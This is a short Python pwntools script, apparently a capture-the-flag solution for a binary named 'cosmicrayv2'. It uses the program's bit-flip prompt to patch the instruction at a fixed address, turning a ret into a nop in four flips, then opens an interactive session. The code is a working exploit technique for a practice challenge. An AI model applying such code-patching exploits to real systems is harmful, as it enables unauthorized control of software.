#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./cosmicrayv2", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def flip(addr, k):
    io.sendlineafter(b"through:", hex(addr).encode())
    io.sendlineafter(b"flip:", str(k).encode())


cosmic_ret = 0x4015e9
pause()
flip(cosmic_ret, 3)  # ret -> shl
flip(cosmic_ret, 1)  # shl -> xchg
flip(cosmic_ret, 6)  # xchg -> xchg
flip(cosmic_ret, 7)  # xchg -> nop

io.interactive()
